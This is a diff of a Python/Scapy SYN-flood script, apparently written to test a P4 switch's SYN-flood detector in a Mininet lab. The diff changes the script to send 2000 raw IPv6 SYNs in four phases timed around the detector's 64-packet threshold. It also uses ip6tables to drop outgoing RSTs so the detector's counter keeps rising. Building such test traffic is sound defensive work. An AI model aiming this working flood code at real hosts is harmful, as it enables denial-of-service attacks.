@@ -1,7 +1,14 @@
 """
-attack.py — SYN Flood attacker script
+attack.py — SYN Flood attacker script (versatile 4-phase pattern)
 Auto-detects own interface, self-assigns IPv6 if p4-utils didn't.
 Uses Scapy sendp() — L2 injection, no kernel ARP/NDP needed.
+
+Traffic pattern (2000 total SYNs):
+  Phase 1 —   60 burst       (below threshold 64 — baiting the counter)
+  Phase 2 — 1000 super-fast  (controller fires THRESHOLD at SYN #64 total)
+  Phase 3 —   64 burst       (second threshold batch)
+  Phase 4 —  876 super-fast  (sustained flood — all dropped by block rule)
+
 Run from any attacker host xterm:
     python3 /home/ayush/my/attack.py
 """
@@ -11,37 +18,28 @@ from scapy.all import Ether, IPv6, TCP, sendp
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-# Enable IPv6 in this namespace (WSL2 disables it on new veth interfaces)
 subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.disable_ipv6=0'], capture_output=True)
 subprocess.run(['sysctl', '-w', 'net.ipv6.conf.default.disable_ipv6=0'], capture_output=True)
 
-# Block outgoing RSTs so h1's kernel doesn't undo the SYN counter.
-# Scapy sends raw SYNs that bypass the kernel — when h0 replies SYN-ACK,
-# h1's kernel sees an unexpected SYN-ACK and sends RST-ACK back,
-# which hits P4's ACK branch and decrements the CMS counter to 0,
-# preventing the threshold from ever being reached.
-subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)   # flush first (clean state)
+# Block outgoing RSTs so the kernel doesn't send RST-ACK when h0 replies
+# with SYN-ACK (Scapy's raw SYNs are unknown to the kernel). Without this
+# the RST hits P4's ACK branch and decrements the CMS counter back to 0.
+subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)
 subprocess.run(['ip6tables', '-A', 'OUTPUT', '-p', 'tcp',
                 '--tcp-flags', 'RST', 'RST', '-j', 'DROP'], capture_output=True)
 
-VICTIM_IP  = "2001:1:1::10"      # h0 IPv6 — matches network.py
-VICTIM_MAC = "aa:00:00:00:00:00" # h0 MAC  — matches network.py
-DST_PORT   = 80
-NUM_PACKETS = 200
-INTER       = 0.01   # 100 pps
+VICTIM_IP   = "2001:1:1::10"
+VICTIM_MAC  = "aa:00:00:00:00:00"
+DST_PORT    = 80
+TOTAL_SYNS  = 2000
 
-# Must match network.py setIntfIp values
 IPV6_MAP = {
-    'h0': '2001:1:1::10',
-    'h1': '2001:1:1::1',
-    'h2': '2001:1:1::2',
-    'h3': '2001:1:1::3',
-    'h4': '2001:1:1::4',
-    'h5': '2001:1:1::5',
+    'h0': '2001:1:1::10', 'h1': '2001:1:1::1', 'h2': '2001:1:1::2',
+    'h3': '2001:1:1::3',  'h4': '2001:1:1::4', 'h5': '2001:1:1::5',
 }
 
+
 def get_iface_info():
-    # Detect interface (Mininet names it h1-eth0 — shows as h1-eth0@ifN in ip link)
     result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
     iface = None
     for line in result.stdout.split('\n'):
@@ -53,21 +51,19 @@ def get_iface_info():
         print("ERROR: could not detect interface")
         sys.exit(1)
 
-    # MAC
     result = subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True)
     mac_m = re.search(r'link/ether ([0-9a-f:]+)', result.stdout)
     mac = mac_m.group(1) if mac_m else None
 
-    # IPv6 — detect from interface, or self-assign if p4-utils skipped it
     result = subprocess.run(['ip', '-6', 'addr', 'show', iface], capture_output=True, text=True)
     ip6_m = re.search(r'inet6 (2001[0-9a-f:]+)/\d+', result.stdout)
     if ip6_m:
         ipv6 = ip6_m.group(1)
     else:
-        hostname = iface.split('-eth')[0]   # 'h1-eth0' → 'h1'
+        hostname = iface.split('-eth')[0]
         ipv6 = IPV6_MAP.get(hostname)
         if ipv6:
-            subprocess.run(['ip', '-6', 'addr', 'add', ipv6 + '/64', 'dev', iface],
+            subprocess.run(['ip', '-6', 'addr', 'add', 'nodad', ipv6 + '/64', 'dev', iface],
                            capture_output=True)
             print(f"[attack] Assigned {ipv6}/64 to {iface}")
         else:
@@ -76,22 +72,40 @@ def get_iface_info():
 
     return iface, mac, ipv6
 
+
 iface, src_mac, src_ipv6 = get_iface_info()
 
 if not src_mac:
     print(f"ERROR: could not detect MAC on {iface}")
     sys.exit(1)
 
-print(f"[attack] Host  : {src_ipv6} ({src_mac}) on {iface}")
-print(f"[attack] Target: {VICTIM_IP}:{DST_PORT}")
-print(f"[attack] Sending {NUM_PACKETS} SYN packets at {int(1/INTER)} pps...")
+print(f"[attack] Host   : {src_ipv6} ({src_mac}) on {iface}")
+print(f"[attack] Target : {VICTIM_IP}:{DST_PORT}")
+print(f"[attack] Pattern: 60 burst -> 1000 fast -> 64 burst -> 876 fast  (2000 total)")
 
-for i in range(NUM_PACKETS):
-    pkt = (Ether(src=src_mac, dst=VICTIM_MAC) /
-           IPv6(src=src_ipv6, dst=VICTIM_IP) /
-           TCP(sport=10000, dport=DST_PORT,
-               flags="S", seq=1000 + i))
-    sendp(pkt, iface=iface, verbose=0)
-    time.sleep(INTER)
 
-print(f"[attack] Done — {NUM_PACKETS} SYNs sent from {src_ipv6}")
+def send_phase(label, n, inter, start_idx):
+    speed = "burst (max)" if inter == 0 else f"{1/inter:.0f} pps"
+    print(f"[attack] {label}  {n} SYNs @ {speed} ...")
+    t0 = time.time()
+    for j in range(n):
+        pkt = (Ether(src=src_mac, dst=VICTIM_MAC) /
+               IPv6(src=src_ipv6, dst=VICTIM_IP) /
+               TCP(sport=10000 + start_idx + j, dport=DST_PORT,
+                   flags="S", seq=1000 + start_idx + j))
+        sendp(pkt, iface=iface, verbose=0)
+        if inter > 0:
+            time.sleep(inter)
+    elapsed = time.time() - t0
+    actual_pps = n / elapsed if elapsed > 0 else 0
+    print(f"[attack]   done  {actual_pps:.0f} actual pps  ({elapsed:.2f}s)")
+    return start_idx + n
+
+
+idx = 0
+idx = send_phase("Phase-1 burst-60   (below threshold):", 60,   0,     idx)
+idx = send_phase("Phase-2 fast-1000  (triggers threshold):", 1000, 0.001, idx)
+idx = send_phase("Phase-3 burst-64   (second threshold batch):", 64,   0,     idx)
+idx = send_phase("Phase-4 fast-876   (post-block flood):", 876,  0.001, idx)
+
+print(f"[attack] Done — {TOTAL_SYNS} SYNs sent from {src_ipv6}")
